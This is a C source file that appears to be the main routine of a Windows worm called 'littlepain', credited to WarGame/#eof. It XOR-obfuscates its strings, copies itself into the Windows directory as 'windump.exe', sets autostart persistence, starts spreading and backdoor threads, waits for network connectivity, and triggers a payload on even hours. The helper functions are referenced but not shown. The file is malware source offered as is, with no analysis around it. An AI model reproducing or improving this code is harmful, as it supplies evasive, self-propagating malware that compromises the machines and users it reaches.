#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <stddef.h>   // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    char my_path[MAX_PATH], new_path[MAX_PATH];
    DWORD ThreadID;
    WSADATA wsa;
    SYSTEMTIME time;

    // "__[__ littlepain by [WarGame,#eof] __]__" XOR'd with key 0x3E
    volatile char sz_mutex[] = {
        '_'^0x3E, '_'^0x3E, '['^0x3E, '_'^0x3E, '_'^0x3E, ' '^0x3E, 'l'^0x3E, 'i'^0x3E,
        't'^0x3E, 't'^0x3E, 'l'^0x3E, 'e'^0x3E, 'p'^0x3E, 'a'^0x3E, 'i'^0x3E, 'n'^0x3E,
        ' '^0x3E, 'b'^0x3E, 'y'^0x3E, ' '^0x3E, '['^0x3E, 'W'^0x3E, 'a'^0x3E, 'r'^0x3E,
        'G'^0x3E, 'a'^0x3E, 'm'^0x3E, 'e'^0x3E, ','^0x3E, '#'^0x3E, 'e'^0x3E, 'o'^0x3E,
        'f'^0x3E, ']'^0x3E, ' '^0x3E, '_'^0x3E, '_'^0x3E, ']'^0x3E, '_'^0x3E, '_'^0x3E,
        0x00^0x3E
    };
    xor_decrypt(sz_mutex, sizeof(sz_mutex), 0x3E);

    // "\\windump.exe" XOR'd with key 0x7A
    volatile char sz_exe_name[] = {
        '\\'^0x7A, 'w'^0x7A, 'i'^0x7A, 'n'^0x7A, 'd'^0x7A, 'u'^0x7A, 'm'^0x7A, 'p'^0x7A,
        '.'^0x7A, 'e'^0x7A, 'x'^0x7A, 'e'^0x7A, 0x00^0x7A
    };
    xor_decrypt(sz_exe_name, sizeof(sz_exe_name), 0x7A);

    // "www.freetibet.org" XOR'd with key 0x1F
    volatile char sz_host[] = {
        'w'^0x1F, 'w'^0x1F, 'w'^0x1F, '.'^0x1F, 'f'^0x1F, 'r'^0x1F, 'e'^0x1F, 'e'^0x1F,
        't'^0x1F, 'i'^0x1F, 'b'^0x1F, 'e'^0x1F, 't'^0x1F, '.'^0x1F, 'o'^0x1F, 'r'^0x1F,
        'g'^0x1F, 0x00^0x1F
    };
    xor_decrypt(sz_host, sizeof(sz_host), 0x1F);

    CreateMutexA(NULL, FALSE, (char*)sz_mutex);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        ExitProcess(0);
    }

    GetModuleFileNameA(NULL, my_path, MAX_PATH);
    GetWindowsDirectoryA(new_path, MAX_PATH);
    strcat(new_path, (char*)sz_exe_name);
    CopyFileA(my_path, new_path, FALSE);
    _AutoStart((BYTE*)new_path);

    if (WSAStartup(MAKEWORD(1,1), &wsa) != 0)
    {
        return 0;
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_L0cal_4, new_path, 0, &ThreadID);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_BackDoor_4, NULL, 0, &ThreadID);

    while (!gethostbyname((char*)sz_host))
    {
        Sleep(1000*60*20);
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)extra, new_path, 0, &ThreadID);

    GetSystemTime(&time);
    if (time.wHour % 2 == 0)
    {
        _Payload();
    }

    Sleep(INFINITE);
    return 0;
}
#pragma optimize("", on)
